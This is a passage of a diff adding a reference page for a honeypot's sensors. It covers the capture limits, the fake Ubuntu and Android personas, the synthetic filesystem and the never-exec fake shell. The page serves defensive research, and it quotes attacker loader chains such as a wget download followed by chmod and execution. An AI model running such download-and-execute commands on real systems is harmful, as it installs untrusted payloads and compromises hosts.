@@ -1,0 +1,2158 @@
+<!--
+title: Sensor behavior reference
+audience: all
+status: current
+owner: maintainer
+applies-to: 0.4.0 (untagged; latest tag v0.1.0)
+last-verified: 2026-10-14
+-->
+
+# Sensor behavior reference
+
+Per-protocol capture behavior for the Propolis sensor layer: what each sensor
+impersonates, what it captures, which events it emits, and the shared framework
+knobs that bound every capture.
+
+There are **12 sensor crates covering 15 protocols** (the `cred` sensor serves
+VNC, MySQL, MSSQL, PostgreSQL, and MongoDB from one binary).
+
+**Canonical owners referenced here.** This page owns *capture behavior*. It does
+not restate values owned elsewhere:
+
+- Env-var names, exact defaults, bounds, and fail behavior:
+  [`environment-variables.md`](environment-variables.md).
+- Ports and binds: [`ports-and-protocols.md`](ports-and-protocols.md).
+- Filesystem paths (log/spool/host-key locations):
+  [`filesystem-paths.md`](filesystem-paths.md).
+- Signal types, event fields, and weights:
+  [`events-and-signals.md`](events-and-signals.md).
+
+> **No compiled-in listen port.** No sensor hardcodes a port. Each takes its bind
+> address from a required env var and refuses to start if absent. The
+> "conventional" ports named below (SSH 22, Telnet 23, and so on) appear only in
+> persona strings and comments; the actual bind is whatever the deploy units
+> supply. Any mapping of a sensor to its conventional port is `[inferred]`.
+
+## Shared wire contract
+
+Every sensor emits the frozen NDJSON `SensorEvent` record defined in `sensor-wire`
+(`crates/sensor-wire/src/lib.rs#SensorEvent`): `v`, `source_ip`, `wan_ip` (nullable),
+`sensor`, `signal_type`, `protocol`, `authenticated`, `observed_at` (RFC 3339),
+`metadata` (JSON), `sample` (optional `SampleRef`), `session_id` (optional),
+`occurrence_id` (optional). Wire
+version is `1` (`crates/sensor-wire/src/lib.rs#WIRE_VERSION`). A captured sample is referenced by
+`SampleRef { sha256, size, orig_name, capture_id }` (`crates/sensor-wire/src/lib.rs#SampleRef`); `orig_name` is a sanitized
+indicator string, never a path component. Signal-type and protocol constants are
+owned by [`events-and-signals.md`](events-and-signals.md).
+
+## Shared framework knobs
+
+All sensors are built on `sensor-framework`. The knobs below are properties of the
+capture machinery, not of any one protocol.
+
+### Connection bounds
+
+`ConnectionBounds` (`crates/sensor-framework/src/bounds.rs#ConnectionBounds`) carries
+`read_timeout`, `idle_timeout`, `max_duration`, `max_captured_bytes`, and
+`max_concurrent`. The struct is **shape only**; concrete values are set per-sensor
+in each `main.rs` and are overridable by env var (owned by
+[`environment-variables.md`](environment-variables.md)). `max_duration` and
+`max_concurrent` are enforced by the listener; the read/idle timeouts and
+`max_captured_bytes` are enforced by each handler's read loop.
+
+A connection accepted past `max_concurrent` is refused immediately (socket closed,
+not queued) (`crates/sensor-framework/src/bounds.rs#ConnectionBounds`). Every bound is validated at startup through
+the one set of typed readers every sensor uses (`crates/sensor-framework/src/env.rs#Env`): a
+present-but-zero, negative or unparseable value is rejected and the process refuses to start,
+naming the variable and quoting the value ("zero never means unlimited"). `sensor-smtp` and
+`sensor-cred` used to fall back to the default on such a value; they no longer do.
+
+Common defaults across the internet-facing TCP sensors are `read_timeout`
+30000&nbsp;ms, `idle_timeout` 60000&nbsp;ms, `max_duration` 600&nbsp;s,
+`max_captured_bytes` 1_000_000 (ssh: 16_777_216, the spool's per-file cap), `max_concurrent` 256 (verified
+`crates/sensor-ssh/src/main.rs#DEFAULT_READ_TIMEOUT_MS`, `crates/sensor-ssh/src/main.rs#DEFAULT_IDLE_TIMEOUT_MS`, `crates/sensor-ssh/src/main.rs#DEFAULT_MAX_DURATION_SECS`, `crates/sensor-ssh/src/main.rs#DEFAULT_MAX_CAPTURED_BYTES`, `crates/sensor-ssh/src/main.rs#DEFAULT_MAX_CONCURRENT`). Per-sensor deviations are noted in the
+protocol table below; the canonical values live in
+[`environment-variables.md`](environment-variables.md).
+
+### Listener model
+
+`run_tcp_listener` (`crates/sensor-framework/src/listener.rs#run_tcp_listener`) binds one TCP
+address, spawns an accept loop, enforces `max_concurrent` with a
+`tokio::sync::Semaphore` (`crates/sensor-framework/src/listener.rs#run_tcp_listener`), and wraps each handler future in
+`tokio::time::timeout(max_duration, fut)` (`crates/sensor-framework/src/listener.rs#run_tcp_listener`). Each connection gets a fresh
+`uuid::Uuid::now_v7()` session id (`crates/sensor-framework/src/listener.rs#run_tcp_listener`).
+
+- **Panic isolation:** each connection handler runs in its own `tokio::spawn`; a
+  panicking handler is caught, logged, and never crashes the accept loop
+  (`crates/sensor-framework/src/listener.rs#run_tcp_listener`).
+- **Accept-error backoff:** `ACCEPT_ERROR_BACKOFF = 20ms` between transient accept
+  errors (`crates/sensor-framework/src/listener.rs#ACCEPT_ERROR_BACKOFF`).
+- **UDP** (`run_udp_listener`, `crates/sensor-framework/src/listener.rs#run_udp_listener`): `UDP_MAX_DATAGRAM = 65536` buffer;
+  **the socket is never handed to the handler**, so a UDP sensor cannot answer a
+  probe by construction (`crates/sensor-framework/src/listener.rs#run_udp_listener`). Each datagram runs in its own bounded task.
+  The two deliberate exceptions are `sensor-tftp` and `sensor-dns`, which do not use this
+  listener: `sensor-tftp` owns a request socket that only receives and a per-transfer socket
+  whose every send passes a byte budget (see [sensor-tftp](#sensor-tftp)), and `sensor-dns`
+  answers each query with a reply no larger than the query, through one guarded send (see
+  [sensor-dns](#sensor-dns)).
+- **Dual-stack normalization** (`normalize_dual_stack`, `crates/sensor-framework/src/listener.rs#normalize_dual_stack`): maps
+  `::ffff:a.b.c.d` down to plain IPv4 (port preserved) before WAN resolution, so a
+  plain-IPv4 WAN map matches a dual-stack peer.
+- `shutdown_signal()` resolves on SIGINT or (Unix) SIGTERM (`crates/sensor-framework/src/listener.rs#shutdown_signal`).
+- **Shutdown of a capturing sensor** (ssh, telnet, adb, ftp, mqtt, tftp): after the listeners are
+  stopped, `CaptureHandoff::drain` (`crates/sensor-framework/src/handoff.rs#CaptureHandoff::drain`)
+  ends the live connections first, then the queue, inside `SHUTDOWN_DRAIN_TIMEOUT` (10 s). A
+  connection gets a grace of at most 3 s (a quarter of the timeout if smaller) to finish; one
+  still open is cancelled and awaited for at most another quarter, which makes its capture guard
+  submit what it had buffered. That capture is stored and emitted with `complete` false and
+  `end_reason` `session_cancelled`. The rest of the timeout drains the queue. A listener only
+  takes part if it was started with the hand-off's tracker (`run_tcp_listener_tracked`,
+  `run_tls_listener_tracked`, or tftp's own request loop); the drain logs a WARN naming the count
+  when connections or queued jobs could not be finished in time.
+
+### WAN attribution
+
+`WanResolver` (`crates/sensor-framework/src/wan.rs#WanResolver::new`, `crates/sensor-framework/src/wan.rs#WanResolver::resolve`) maps the local bound
+address a connection landed on to the operator's WAN IP. An unmapped local address
+resolves to `None`, and the event's `wan_ip` is null (a documented case, not an
+error). No-NAT deployments carry an identity entry (local == WAN) (`crates/sensor-framework/src/wan.rs#WanResolver::new`).
+
+### Persona (single fictional host)
+
+One coherent host identity is resolved from `persona.rs` so no two sensors
+contradict each other (`crates/sensor-framework/src/persona.rs`): **Ubuntu
+22.04.4 LTS "Jammy Jellyfish"**, kernel `5.15.0-91-generic`, `#101-Ubuntu SMP`,
+`x86_64` (`crates/sensor-framework/src/persona.rs#OS_PRETTY`, `crates/sensor-framework/src/persona.rs#OS_VERSION`, `crates/sensor-framework/src/persona.rs#KERNEL_RELEASE`, `crates/sensor-framework/src/persona.rs#KERNEL_BUILD`, `crates/sensor-framework/src/persona.rs#ARCH`). Default hostname is `server01`, overridable with
+`PROPOLIS_HOSTNAME` (`crates/sensor-framework/src/persona.rs#DEFAULT_HOSTNAME`, `crates/sensor-framework/src/persona.rs#ENV_HOSTNAME`, `crates/sensor-framework/src/persona.rs#hostname`). The SSH banner default is
+`OpenSSH_8.9p1 Ubuntu-3ubuntu0.10` (`crates/sensor-framework/src/persona.rs#OPENSSH_VERSION`). Helpers produce a consistent
+`uname -a` string and `/proc/version`; the shell builds its
+`root@<host>:<cwd>#` prompt from that identity and its current state
+(`crates/sensor-framework/src/persona.rs#uname_all`, `crates/sensor-framework/src/persona.rs#proc_version`, `crates/sensor-framework/src/shell/mod.rs#FakeShell::prompt`).
+
+`sensor-adb` resolves a **second** identity from the same file: a rooted Nexus 5 on
+Android 6.0.1 (build M4B30Z, kernel 3.4.0, armv7l). ADB is Android's own debug
+protocol, so the device the CNXN banner announces, the `adb shell` prompt, `uname`,
+`/system/build.prop` and the filesystem all come from that half, and the banner cannot
+drift from the shell the way it had. The device is rooted, which is why it grants a root
+shell over ADB and carries busybox and `su`.
+
+### Fake filesystem
+
+`fakefs.rs` is an in-memory static snapshot, fresh per session, with no real
+filesystem underneath, so path traversal is structurally impossible
+(`crates/sensor-framework/src/fakefs.rs`). It serves canned `/etc/hostname`,
+`/etc/passwd` and `/etc/group` (a stock 22.04 cloud image's system accounts plus `ubuntu`
+uid 1000 and `lxd`, `crates/sensor-framework/src/etc.rs#PASSWD`), `/etc/shadow` and
+`/etc/gshadow` (mode 0640, group `shadow`; root's yescrypt-shaped hash is random per process
+and hashes no password, `crates/sensor-framework/src/etc.rs#root_password_hash`),
+`/etc/hosts` (loopback and IPv6 multicast only - no routable IPs), `/etc/os-release` (a link
+to `../usr/lib/os-release`, as on 22.04), the installer's static netplan file
+(`/etc/netplan/00-installer-config.yaml`, RFC 1918 address), `/etc/default/locale`, root's
+`.bashrc` and `.profile` (the stock ones), `/proc/version`, `/proc/cpuinfo` (Intel Xeon
+E5-2686 v4, 1 core, every field a real one lists), `/proc/meminfo`, and one mount table
+behind `/proc/mounts`, `/proc/self/mounts`, `/etc/mtab`, `/proc/self/mountinfo` and the
+shell's `mount` (a stock Ubuntu cloud image on `/dev/root`, the Xen disk `xvda`; every mount
+point it names is a directory the shell will enter). A file the session writes carries the
+session clock's time, so `ls -l` dates it now. Directories include `/`, `/tmp`, `/root`, `/etc`,
+`/home/ubuntu`, the loader-probed `/var/run`, `/mnt`, `/usr`, `/dev`, `/dev/shm`, and the
+`/sys`, `/run` and `/boot` subtrees the mount table names. The Ubuntu persona has the 84
+executables recorded from a real Ubuntu 22.04 (`/bin/busybox`, `/bin/ls`, `/bin/echo`,
+`/bin/cat`, `/bin/bash`, `/usr/bin/wget` and the rest of `BINARIES`,
+`crates/sensor-framework/src/binaries.rs#BINARIES`; `/bin/sh` is a link to dash), each a
+synthetic ELF image: the first 64 bytes a real one starts with, then a body generated from that
+header out to its real size (`crates/sensor-framework/src/elf_body.rs`), so a probe that reads
+the header or the length sees what Ubuntu shows and `cp /bin/busybox x` has something to copy.
+
+The body is laid out the way the GNU toolchain lays out a binary with that header's counts and
+offsets, so the tools an attacker inspects a binary with agree with it: `readelf -lhSdV
+--dyn-syms` reads it without a warning, `file` calls every image but busybox an "ELF 64-bit LSB
+pie executable, x86-64, ... dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
+BuildID[sha1]=..., for GNU/Linux 3.2.0, stripped" and busybox (whose recorded header is a static
+`ET_EXEC`) "statically linked", `strings` opens on the loader path, the imported libc names,
+`libc.so.6` and its `GLIBC_2.x` versions and finds the program's usage line further in, and
+`objdump -d` decodes `endbr64` at the entry point and names the PLT stubs (`strerror@plt`);
+`crates/sensor-framework/examples/elf_image.rs` writes one image to a file to run them on. It has
+a program header table that matches the sections, `.interp`, a per-binary GNU build ID,
+`.dynsym`/`.dynstr`/version tables importing real libc symbol names under their glibc versions,
+relocations, `.dynamic`, a `.rodata` of short usage and error strings for that program, zero
+padding at alignment boundaries, a `.text` of instruction-shaped noise seeded per binary (it
+decodes and means nothing; no real code is shipped and none runs), and the section header table
+at the recorded `e_shoff`. Each byte is computed from the image and its offset in constant time
+and memory, nothing is stored, and every binary differs from every other (`true` and `false`,
+which share a header and size, included); the digest of each is the same in every session
+(`crates/sensor-framework/src/binaries.rs#GOLDEN_SHA256`). The images are generated data, never
+a file of the host, and nothing runs them. `/bin/ls` holds its first newline at 409 (as the
+recorded `head -n 1` shows); busybox and `ip` hold theirs in the recorded header, and every other
+image past it, where its layout puts it. `/proc/self/exe` is the executable of the process that
+opens it: an applet of `busybox` reads busybox, a direct `cat` reads cat, a redirection the
+shell opens (`cat < /proc/self/exe`) and `/proc/$$/exe` read bash (dash in a shell opened
+with `sh`). The phone's binaries stay stubs and it has no `/proc/self/exe`. A copy of the
+busybox image runs as a renamed busybox does: `.bb: applet not found` (127), or the
+multi-call binary when the copy's name begins `busybox`. A copy of any other modeled binary
+runs as that binary (`cp /bin/dash /tmp/x; /tmp/x -c CMD` is `sh -c CMD`), and a file the
+session wrote runs as itself whatever its name: `/tmp/w` is the attacker's file, never `w`
+(`crates/sensor-framework/src/shell/mod.rs#FakeShell::run_saved_executable`).
+
+`FakeFs::android()` is the same machinery over the phone's filesystem: `/system` (mounted
+read-only, so a write there is refused as on a real device), `/system/bin`,
+`/system/xbin/busybox`, `/data/local/tmp` and `/sdcard` (the two directories an ADB
+dropper writes to), `/default.prop`, `/system/build.prop` and an Android mount table. The phone
+is a rooted device, so files a shell writes belong to `root` and carry the session clock as their
+modification time, as `id` and the prompt say.
+
+The snapshot is **writable for the length of one session**: a bare redirection, a fetch
+that saves to a file, `cp`, `mkdir` and `rm` all change what the rest of that session
+sees, and `chmod` marks a file executable so running it succeeds. That is what lets a
+loader chain behave: `>/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/` completes, and
+`wget URL -O x; chmod 777 x; ./x; rm -rf x` finds its payload at every step and leaves
+nothing behind. Nothing persists between sessions.
+
+### Persona fidelity
+
+The Ubuntu persona is one host that every command describes the same way, because each
+fact has one source that every reader consults. A fingerprinting survey compares answers
+across commands, so the agreement is the property, not any single format:
+
+- **Processes.** One table (`crates/sensor-framework/src/shell/procs.rs#FakeShell::process_table`)
+  holds a 22.04 server's kernel threads and services with their owners, priorities and start
+  times. `ps`, `top`, `pgrep`, `pidof`, the `/proc/<pid>` tree, `/proc/loadavg`'s task count,
+  and `systemctl status`'s main PID, memory and command line all read it.
+- **Time.** One boot time and load figure (`crates/sensor-framework/src/shell/hostinfo.rs#uptime_secs`)
+  behind `uptime`, `uptime -p`, `/proc/uptime`, `/proc/loadavg`, `top`'s header, `w` and the
+  `START` and `since` of every process and unit. A file the session writes carries the session
+  clock's time.
+- **Network.** One model behind `ip addr`, `ip route`, `hostname -I`, `ss`, `/proc/net/*` and
+  `lshw -C network` (the MAC and address `ip link` shows). `ss` lists resolved's stub on
+  `127.0.0.53` beside sshd, in iproute2 5.15's recorded layout.
+- **Units.** A service is running exactly when its main process is a row of the table; whether
+  it is enabled is the symlink under `/etc/systemd/system/*.wants` the filesystem holds, so
+  `systemctl enable`/`disable` change what `is-enabled` and `ls` read. A unit file the session
+  writes loads from where it was written, `enable` links it with systemd's own messages, and it
+  stays `inactive (dead)`: nothing is ever started
+  (`crates/sensor-framework/src/shell/admin.rs#FakeShell::cmd_systemctl`).
+- **Scheduled jobs.** `crontab` reads and writes `/var/spool/cron/crontabs/root` with the header
+  Debian's cron writes and its recorded validation errors, so `crontab -l`, `cat` and `ls -l`
+  agree (`crates/sensor-framework/src/shell/admin.rs#FakeShell::cmd_crontab`).
+- **Packages.** One package database (`crates/sensor-framework/src/packages.rs#installed`),
+  recorded from a 22.04 server install, behind `dpkg -l`, `dpkg -s`, `apt list` and apt's
+  install and upgrade answers. `openssh-*` is at the version the SSH banner announces and that
+  `ssh -V` prints. Nothing is ever fetched or installed: `apt update` reports the indexes
+  unchanged, `install` of an installed package is "already the newest version" and of anything
+  else "Unable to locate package"
+  (`crates/sensor-framework/src/shell/pkg.rs#FakeShell::cmd_apt`).
+- **Hardware.** `/proc/cpuinfo`, `nproc`, `top`'s CPU line, `lspci`, `lshw` and the `xvda` disk
+  describe one Xen guest with one Xeon E5-2686 v4
+  (`crates/sensor-framework/src/shell/hw.rs#FakeShell::cmd_lspci`).
+- **Accounts and logins.** `/etc/passwd`, `/etc/group`, `/etc/shadow` (root's hash is random
+  per process and hashes no password) and `getent` agree; an SSH exec logs nobody in, so
+  `who` is empty and `uptime` says `0 users`, while an interactive login is the one user
+  `who` and `w` show, from the session's own peer address.
+
+Formats were recorded on 2026-10-07 from a systemd-booted `ubuntu:22.04` reference (coreutils
+8.32, procps-ng 3.3.17, iproute2 5.15, systemd 249, OpenSSH 8.9p1, dpkg 1.21.1, apt 2.4.14,
+cron 3.0pl1); what could not be recorded there (the reference ran on other hardware and could
+not send ICMP) is marked `[unverified]` where the code defines it.
+
+### Fake shell (SSH, Telnet, ADB)
+
+`shell/mod.rs` presents interactive and one-shot shells shared by SSH, Telnet, and ADB
+(`crates/sensor-framework/src/shell/mod.rs`). It is **never-exec and no-fetch by
+construction**: there is no process-spawn API and no HTTP/network-fetch client
+anywhere in the crate; `wget`/`curl` return canned transcripts with zero network
+I/O (`crates/sensor-framework/src/shell/mod.rs`). This is asserted by `never_exec_static_check` and
+`workspace_lockfile_has_no_http_client_crate` in
+`crates/sensor-ssh/tests/shell_test.rs`.
+
+- One `honeypot_command_exec` is emitted per non-blank input line, except that a
+  binary line or a line past the per-connection cap of 256 commands
+  (`MAX_COMMANDS_PER_SESSION`, `crates/sensor-framework/src/shell/mod.rs#MAX_COMMANDS_PER_SESSION`, shared by every shell on the connection through
+  `crates/sensor-framework/src/budget.rs#ConnectionBudget`) yields at most one marker event per session
+  per flood kind; a blank line produces no event or output (`crates/sensor-framework/src/shell/mod.rs#FakeShell::handle_input`).
+  A repeated command past its source network's command-event budget is folded into a summary
+  instead ([below](#command-event-budget-ssh-telnet-adb)). The raw
+  line is recorded verbatim in
+  `metadata.command`, sanitized and capped at `MAX_COMMAND_LEN = 1024` (`crates/sensor-framework/src/shell/mod.rs#MAX_COMMAND_LEN`, `crates/sensor-framework/src/shell/mod.rs#FakeShell::handle_input`).
+- If the line is single-byte-XOR obfuscated, `command_decoded` and `xor_key` are
+  added to metadata (`crates/sensor-framework/src/shell/mod.rs#FakeShell::handle_input`).
+- `metadata.command` collapses every line break into a space. When the command had a break (a
+  single trailing terminator does not count), the event also carries `command_lines`: the lines,
+  each sanitized, blank lines kept, at most 64 lines and 1024 bytes together
+  (`crates/sensor-framework/src/shell/mod.rs#command_lines`). `command_lines_truncated` is `true`
+  when lines or bytes were left out. `command` is unchanged, so the campaign indexer, the ATT&CK
+  rules and the fingerprints read what they always did; the console renders the lines when the key
+  is present. The key is not written for the XOR-decoded form, and events recorded before it
+  existed show only the collapsed command. A line that is mostly line breaks (over 30% non-printable
+  characters, newlines included) is a `binary` flood marker and carries no lines.
+- The command event also carries the shell's `reply`: what the line printed (standard output and
+  standard error together, as the bot read it), sanitized per line like a command, at most
+  `REPLY_TEXT_CAP = 4096` bytes, with the SHA-256 of the kept text, `len` (everything printed) and
+  `truncated` (`crates/sensor-framework/src/shell/mod.rs#reply_ref`). A command that printed nothing
+  carries none, and neither does a line left waiting for input (its output is not recorded when it
+  later runs). The reply is part of the sensor's own log record; intake folds the digest, length and
+  truncation flag into `metadata` (`output_sha256`, `output_len`, `output_truncated`) and stores the
+  text once per digest ([shell output table](database.md#shell-output-table)). Intake refuses a
+  line whose digest is not the text's, whose text is over the cap or holds a NUL.
+- One `ConnectionBudget` per connection (`crates/sensor-framework/src/budget.rs#ConnectionBudget`, limits in `crates/sensor-framework/src/budget.rs#BudgetLimits::standard`)
+  bounds what a session can make the sensor hold or send: 192 KiB of created file content and 4096
+  created nodes (a removed file's slot is not freed), 64 recorded downloads per connection and 8 per
+  line, 16 MiB written to the peer, and per input line a work allowance and a re-entry depth of 16.
+  A refused write prints the kernel's own `No space left on device`, `File too large` or
+  `File name too long` (names over 255 per component or 4096 per path). Past the download cap the
+  connection's one `download_cap` marker is emitted and no further `honeypot_file_download` events;
+  a refused re-entry, loop or nesting is a silent failure with status 1, never an error string. A connection that has written its 16 MiB is dropped after
+  the reply that spent it.
+- The work allowance pays for pattern matching by the steps it takes, not the bytes it is given:
+  a line runs synchronously on a runtime worker, so a match whose cost grows faster than its
+  operands would hold that worker, and every session sharing it, for as long as it ran. Glob
+  patterns (`case`, pathname expansion, `find -name`/`-path`, `dpkg -l`, `apt list`) compile once
+  to the pieces between their stars, with each bracket expression reduced to sorted ranges; a
+  piece of plain text is found with a linear substring search, and every comparison is a step
+  (`crates/sensor-framework/src/shell/glob.rs#FakeShell::glob_matches`). `grep -F` finds a fixed
+  string with a two-way searcher (linear in the bytes read, `-i` by lowercasing the needle once
+  and each line once), and `grep` charges every search past the first pass over its input, which
+  `-o` and `-w` make when they look again from a later offset
+  (`crates/sensor-framework/src/shell/grep.rs#FakeShell::cmd_grep`). A match the line cannot pay
+  for stops the line there, as when the allowance runs out anywhere else. `pgrep` and `pkill`
+  take each pattern alternative's steps (items times text length, plus class range tests) from
+  the line's remaining allowance before it runs over the process table
+  (`crates/sensor-framework/src/shell/procs.rs#FakeShell::select_charged`).
+- The work allowance pays for what a command does, not only for what it prints: a file a command
+  reads is charged before it is read, at the one function every file read goes through
+  (`crates/sensor-framework/src/shell/read.rs#FakeShell::read_operand`, and `read_charged` for
+  the few that read a whole path), and output is charged only beyond what the reads paid, `grep`
+  charges each `-e`/`-f` pattern as it compiles it (at most 4,096 patterns and 4 MiB of compiled
+  programs, then `grep: memory exhausted`; `awk` charges each `/re/` literal of its program under
+  the same caps, then `awk: out of memory`, `crates/sensor-framework/src/shell/awk.rs#Parser`),
+  every copy `tee` makes is
+  charged before it is made, output that can outgrow its input (`cut --output-delimiter`) stops
+  the line once it passes what the line can still pay for, and a count a command is given (`tr`'s `[c*n]`, up to 2^64-2) is
+  costed by its constructs, never walked. A line runs synchronously on the sensor's runtime, so
+  what its allowance buys is the longest one line can hold a worker.
+- A command that loops over its operands pays for each trip before it builds that trip's output:
+  a fee of 64 steps (`crates/sensor-framework/src/shell/read.rs#OPERAND_COST`), the operand's
+  bytes and the bytes the trip is about to add (`pay_operand`, `push_paid` and `append_paid` in
+  the same file), so a line that gives `printenv`, `alias`, `type`, `command -V`, `which`,
+  `dpkg -s`, `apt show`, `ls`, `df`, `mv`, `ln`, `touch`, `chmod`, `rm`, `mkdir`, `rmdir`, `kill`,
+  `realpath` or `readlink` more operands than the allowance can pay for (about 65,000 at the
+  fee alone) ends there, as when the allowance runs out anywhere else, and a reader that goes
+  through `read_operand` (`cat`, `head`, `tail`, `wc`, `od`, the checksum tools) pays the fee for
+  each file it opens, present or not. A builder whose output outgrows its input stops at what the
+  line can still spend: `stat -c`/`--printf` pads a directive with a width up to 4096 bytes, the
+  Android `tr` expands ranges and classes (`expand_set`), `pgrep -d` and `pidof -S` place the
+  session's delimiter between every two rows, and `chattr` charges each change for each node it
+  visits. The configuration files a command consults for its answer (`/etc/passwd`,
+  `/etc/group`, `/etc/hosts`, `/proc/meminfo`, `/proc/cpuinfo`) are charged by size on each
+  read (`config_bytes`), so a loop of `getent`, `nslookup`, `free`, `nproc` or `ls -l` over a
+  file the session grew to its 64 KiB cap stops where a loop of `cat` would. GNU `tr` reads a
+  SET in linear time (the search for a closing `:]` or `]` remembers where the last one ended)
+  and is charged for the SET's bytes first, `env NAME=VALUE...` finds each name's slot in a hash
+  map, and adb charges every Android command's argument bytes before dispatch (the toybox
+  option check among them), which keeps one entry per distinct letter.
+- On SSH, telnet and ADB the session's own heap is counted too
+  (`crates/sensor-framework/src/session_memory.rs`): a line that takes the session past what it
+  may hold while a line runs stops at its next step, as when its work allowance runs out (the
+  trace notes a memory hit), and a session still holding more than it may keep after a line is
+  ended (`end_reason` `memory_limit`). See
+  [capacity planning](../operations/capacity-planning.md#session-memory-sensor-ssh-sensor-telnet-sensor-adb-sensor-mqtt).
+- A fetch verb the line executes additionally emits `honeypot_file_download` with
+  `metadata.url`, capped at `MAX_URL_LEN = 512` (`crates/sensor-framework/src/shell/mod.rs#MAX_URL_LEN`, `crates/sensor-framework/src/shell/fetch.rs#FakeShell::append_downloads`).
+- **Standard input.** The sensors run each line through `start_line`
+  (`crates/sensor-framework/src/shell/mod.rs#FakeShell::start_line`), which decides by the
+  shell's own model of the commands whether the line reads the session's input: it runs the line
+  with that input open and empty, and a command that reads past what has arrived (`cat` with no
+  file or `-`, `cat > f`, `cat >> f`, `dd` without `if=`, `base64 -d`, `head`, `read`, a bare `sh`
+  given a script on a pipe, any of these inside `sh -c '...'`, a `{ }` group or a pipeline's first
+  stage) makes the line wait. Everything that run did is rolled back (the shell's state, the
+  connection's filesystem and the budget counters its writes moved), so the line runs exactly
+  once, by `finish_line`, on the input that arrived. A command that reads no input never waits,
+  whatever its name; a here-document, `< file` or a pipe gives a reader its input without the
+  session's. The waiting line's `honeypot_command_exec` is emitted at once, without `status`. How
+  the input arrives is the sensor's (`crates/sensor-framework/src/held_input.rs#HeldInput`): the
+  rest of an SSH exec channel up to its EOF, or what is typed at a terminal, in canonical mode:
+  a line reaches the command at Enter, Backspace and Ctrl-U edit the line being typed, Ctrl-D at
+  the start of a line is end of input (elsewhere it hands over the line so far), Ctrl-C kills the
+  command (status 130, the rest of the line skipped, `^C` echoed), control characters echo as
+  `^X`. Input cut off (a closed channel, the session's end) kills the command as a hangup (status
+  129) at the read it waited in, keeping what it wrote. The input is bounded by
+  `max_captured_bytes` and the capture memory budget; reaching either ends it there and the
+  command sees end of file. What the command consumed is captured as `exec_stdin` or
+  `shell_stdin` ([events-and-signals.md](events-and-signals.md#capture_reason-and-the-standard-input-keys)).
+  At an interactive shell's terminal each Enter reruns the waiting line on the lines typed so far
+  with the input still open (`crates/sensor-framework/src/shell/mod.rs#FakeShell::try_finish_line`):
+  a line whose readers had all they wanted finishes there, so `read x; echo $x` and `head -n 1`
+  answer after their line as a real terminal's do, and the bytes after that Enter are the next
+  command. A line that still wants more (`cat > f`) is undone and keeps waiting; it is rerun at
+  most `RESUME_ATTEMPTS` (64) times and on at most `RESUME_BYTES` (64 KiB) of input, past which
+  it waits for the input to end. Output is sent when the command ends, not as it reads: a typed
+  `cat` with no redirection prints its lines after Ctrl-D, not one by one.
+- Shell identity is state, not fixed response text (`crates/sensor-framework/src/shell/mod.rs#ShellContext`, `crates/sensor-framework/src/shell/mod.rs#FakeShell::prompt`). An Ubuntu login starts as
+  `-bash`, uses the interactive command-not-found handler and a prompt that follows
+  the working directory. The persona has the `command-not-found` package, whose handler answers a
+  name it has no suggestion for with the bare `f: command not found` (a host without the package
+  would print `-bash: f: command not found`). A bash that runs a script has no handler: SSH exec,
+  `bash -c`, `bash FILE` and a script on standard input say `bash: line N: f: command not found`,
+  naming `$0` and the line, and word syntax errors `bash: -c: line N: syntax error near unexpected
+  token `)'` with the offending line quoted after it. SSH exec has no prompt.
+  Bare `su`, `sh`, `bash` and `ash` push nested levels; dash levels have their own
+  `sh: N:` line counters. `exit` pops one level, and only exiting the outer level
+  sets `close_session`. Android starts and nests as mksh with `sh:` diagnostics.
+- Input is read as a shell reads it, by a lexer, parser and evaluator
+  (`crates/sensor-framework/src/shell/lex.rs`, `crates/sensor-framework/src/shell/parse.rs`,
+  `crates/sensor-framework/src/shell/eval.rs`), not split on whitespace. Quotes and backslashes,
+  `$VAR`, `${VAR:-w}`, `$?`, `$$`, `$0`, `$!`, `$#`, `$1..`, `$(( ))` (64-bit wrapping;
+  division by zero prints bash's `division by 0 (error token is "0")`), `$( )` and backticks, `~`,
+  field splitting at `$IFS` and globbing over the fake filesystem (1,024-name cap) expand in
+  POSIX order (`crates/sensor-framework/src/shell/expand.rs`, `crates/sensor-framework/src/shell/arith.rs`).
+  Redirections (`>`, `>>`, `<`, here-documents, `N>&M`, `>&-`, `/dev/null`) are opened before the
+  command runs and apply to a whole loop or group as well as a simple command; a bash target
+  that expands to other than one word is `-bash: WORD: ambiguous redirect`. Pipelines run every
+  stage, feeding each the one before, and take the last stage's status; `&&` and `||` decide on
+  status alone; `!`, `( )`, `{ }`, `if`, `for`, `while` and `until` run with the state-copy rules
+  (`( )`, a pipeline stage, `$( )` and `&` get a copy of the working directory and variables;
+  `{ }` does not). A trailing `&` runs the command at once and, in an interactive login shell,
+  prints `[N] PID`. An unfinished construct waits for more input under the PS2 prompt `> ` (64
+  lines or 64 KiB at most). `case WORD in pat|pat) list ;; ... esac` runs the first arm whose
+  pattern matches (unquoted `*`, `?` and `[..]` glob, a quoted one is literal, a `/` matches);
+  no match is status 0. Constructs outside this subset (`[[ ]]`, `(( ))`, `coproc`, `$'..'`,
+  `${x##*/}`, brace expansion, `<<<`, arrays, process substitution) parse and are skipped with
+  status 0 and no output (under dash, which has none of `[[ ]]`, `(( ))`, `coproc`, `$'..'`,
+  brace expansion, `<<<`, `|&` or arrays, those read as the plain text or subshells dash reads); what
+  bash and dash also reject prints their syntax error and status 2. dash's wording is its own
+  (`crates/sensor-framework/src/shell/eval.rs#FakeShell::syntax_error_text`): `word unexpected`
+  for a plain word, a quoted name for a reserved word or operator, `(expecting "fi")` where the
+  grammar waited for one token, `end of file unexpected`, and the fixed complaints
+  `Bad for loop variable`, `Unterminated quoted string`, `EOF in backquote substitution`,
+  `Missing '}'` and `Missing '))'`; `Bad fd number`, `Bad substitution` and an arithmetic
+  division by zero end the shell with status 2 when the word runs.
+  `read`, `export`, `unset`, `set`, `shift`, `umask`, `break`, `continue`, `return`, `local`,
+  `builtin`, `cd`, `exit` act on the shell itself
+  (`crates/sensor-framework/src/shell/builtins.rs`); `source`, `.` and `eval` only record intent.
+  Shell functions run (`crates/sensor-framework/src/shell/eval.rs#FakeShell::call_function`).
+  `name() body` and, in bash, `function name [()] body` store the body; a call runs it in the same
+  shell with its own `$1`..`$n`, `$#` and `$@` (put back afterwards, `$0` unchanged), its own
+  `local` variables (restored on return; dash keeps the value of a bare `local x`, bash unsets
+  it), no enclosing loop for `break`, and `return [n]` for the status, which otherwise is the
+  last command's. A function is found before a builtin or a file; `command` and `builtin` skip
+  it, and a program another command starts (`env f`, `sh -c f`) does not see it. A redirection
